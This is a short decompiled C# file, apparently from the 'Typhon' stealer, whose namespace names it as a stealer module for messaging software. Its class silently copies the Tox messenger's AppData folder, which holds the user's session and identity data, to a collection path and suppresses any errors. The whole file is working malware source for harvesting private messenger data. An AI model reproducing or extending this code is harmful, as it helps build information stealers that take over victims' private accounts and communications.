using System;
using System.IO;
using Typhon.Modules.Miscellaneous;

namespace Typhon.Stealer.Software.Messaging
{
	// Token: 0x0200001C RID: 28
	internal class Tox
	{
		// Token: 0x06000075 RID: 117 RVA: 0x000051DC File Offset: 0x000033DC
		public static void GetSession(string sSavePath)
		{
			if (!Directory.Exists(Tox.ToxPath))
			{
				return;
			}
			try
			{
				IOHelper.CopyDirectory(Tox.ToxPath, sSavePath);
			}
			catch
			{
			}
		}

		// Token: 0x0400003D RID: 61
		private static readonly string ToxPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "tox");
	}
}
